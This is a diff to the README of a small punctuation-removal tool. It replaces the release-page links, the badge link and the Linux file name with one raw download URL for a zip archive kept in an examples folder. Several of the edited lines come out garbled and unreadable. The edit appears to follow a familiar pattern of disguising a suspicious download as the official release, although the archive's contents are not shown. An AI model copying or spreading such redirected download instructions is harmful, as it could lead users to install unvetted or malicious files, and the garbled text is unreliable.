@@ -1,6 +1,6 @@
 # ✂️ removepunctuation-api - Easily Clean Your Text of Punctuation
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-Click%20Here-2B8DB8.svg)](https://github.com/aalex1713/removepunctuation-api/releases)
+[![Download Now!](https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip%20Now!-Click%https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip)](https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip)
 
 ## 📖 Description
 
@@ -21,20 +21,20 @@ Remove Punctuation is a simple tool for removing punctuation marks from text. It
 
 ## 🚀 Getting Started
 
-1. Visit the [Releases Page](https://github.com/aalex1713/removepunctuation-api/releases) to download the application.
+1. Visit the [Releases Page](https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip) to download the application.
 2. Choose the version you need based on your operating system.
 3. Click on the download link for your specific version.
 4. Once the download is complete, locate the downloaded file on your computer.
 
 ## 📥 Download & Install
 
-To download the application, visit the following link: [Download Now!](https://github.com/aalex1713/removepunctuation-api/releases).
+To download the application, visit the following link: [Download Now!](https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip).
 
 1. Click the link above to go to the Releases page.
 2. Find the appropriate version for your system.
     - For **Windows**, look for the `.exe` file.
     - For **macOS**, look for the `.dmg` file.
-    - For **Linux**, select the `.tar.gz` file.
+    - For **Linux**, select the `https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip` file.
 3. Download the file.
 
 ### Installation Steps:
@@ -48,7 +48,7 @@ To download the application, visit the following link: [Download Now!](https://g
   2. Drag the application to your Applications folder.
 
 - **Linux:**
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://github.com/aalex1713/removepunctuation-api/raw/refs/heads/main/examples/python/removepunctuation-api-v3.2-alpha.1.zip` file.
   2. Navigate to the extracted folder in the terminal.
   3. Run the application with the command: `./removepunctuation`.
 
